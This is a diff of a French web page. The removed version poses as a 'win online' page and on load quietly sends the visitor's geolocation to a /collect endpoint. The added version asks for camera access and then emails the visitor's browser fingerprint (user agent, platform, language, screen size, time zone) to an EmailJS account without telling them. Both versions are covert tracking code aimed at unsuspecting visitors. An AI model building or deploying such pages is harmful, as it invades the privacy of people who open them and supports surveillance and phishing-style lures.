@@ -1,40 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-  <title>Gagner en ligne</title>
-  <script>
-    function envoyerInfos() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          const form = document.createElement('form');
-          form.method = 'POST';
-          form.action = '/collect';
-
-          const latField = document.createElement('input');
-          latField.type = 'hidden';
-          latField.name = 'latitude';
-          latField.value = latitude;
-          form.appendChild(latField);
-
-          const longField = document.createElement('input');
-          longField.type = 'hidden';
-          longField.name = 'longitude';
-          longField.value = longitude;
-          form.appendChild(longField);
-
-          document.body.appendChild(form);
-          form.submit();
-        });
-      } else {
-        alert("La géolocalisation est désactivée !");
-      }
+  <meta charset="UTF-8" />
+  <title>Caméra et Infos Visiteur</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #eef2f7;
+      color: #222;
+      text-align: center;
+      padding: 50px 20px;
     }
-  </script>
+    h1 {
+      font-weight: 600;
+      margin-bottom: 25px;
+    }
+    video {
+      border: 3px solid #555;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      height: auto;
+      box-shadow: 0 0 12px rgba(0,0,0,0.2);
+      margin-bottom: 30px;
+    }
+  </style>
 </head>
-<body onload="envoyerInfos()">
-  <h1>Chargement...</h1>
+<body>
+  <h1>Activation de la caméra...</h1>
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    // Initialisation EmailJS avec ta clé publique
+    emailjs.init("xyCvBNym0bNzY7Dbg");
+
+    // Demande d'accès caméra
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const videoElem = document.getElementById('video');
+        videoElem.srcObject = stream;
+
+        // Données à envoyer
+        const infos = {
+          user_agent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          resolution: `${screen.width}x${screen.height}`,
+          time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          date_time: new Date().toLocaleString()
+        };
+
+        // Envoi des données à EmailJS
+        emailjs.send('service_9f6f19q', '__ejs-test-mail-service__', infos)
+          .then(() => console.log("Email envoyé avec succès"))
+          .catch(err => console.error("Erreur d'envoi EmailJS :", err));
+      })
+      .catch(err => {
+        console.error("Erreur d'accès à la caméra :", err);
+        alert("Impossible d'accéder à la caméra.");
+      });
+  </script>
 </body>
 </html>
